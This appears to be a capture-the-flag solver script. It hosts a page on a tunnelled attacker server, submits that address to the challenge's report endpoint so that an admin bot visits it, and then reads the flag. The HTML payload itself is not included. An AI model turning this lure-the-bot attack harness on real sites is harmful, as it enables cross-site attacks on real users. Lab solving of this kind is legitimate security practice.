from http.server import BaseHTTPRequestHandler, HTTPServer
import os, requests, threading, time

host_id = '' #automatically set
ip_challenge = 'http://94.237.59.207:37901'
your_server = '5cf9a91e59f158.lhr.life'
your_server_port = 80

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/agent_details':
            self.send_response(200)  # HTTP OK
            self.end_headers()

            # Open and read the HTML file
            with open('agent_details.html', 'r') as file:
                self.wfile.write(file.read().replace('host-id',host_id).encode('utf-8'))
        else:
            self.send_response(404)  # Not Found
            self.end_headers()
            self.wfile.write(b'404 Not Found')

def run_server(server_class=HTTPServer, handler_class=RequestHandler, port=8000, run_time=60):
    # Create and start the server
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)

    # Run the server in a separate thread
    def serve():
        print(f'Starting server on port {port} for {run_time} seconds...')
        httpd.serve_forever()

    server_thread = threading.Thread(target=serve)
    server_thread.start()

    send_payload = requests.post(ip_challenge+'/report_tornardo', params={'ip':your_server+f':{your_server_port}'})
    time.sleep(run_time)

    # Shutdown the server after the specified time
    print('Shutting down the server...')
    httpd.shutdown()
    server_thread.join()

if __name__ == '__main__':
    host_id = requests.get(ip_challenge+'/get_tornados').json()[0]['machine_id']

    # Run the server for 60 seconds (or change to your desired duration)
    run_server(port=8000, run_time=5)  # You can adjust the run_time in seconds

    

    flag = requests.get(ip_challenge+'/get_tornados').json()[0]['machine_id']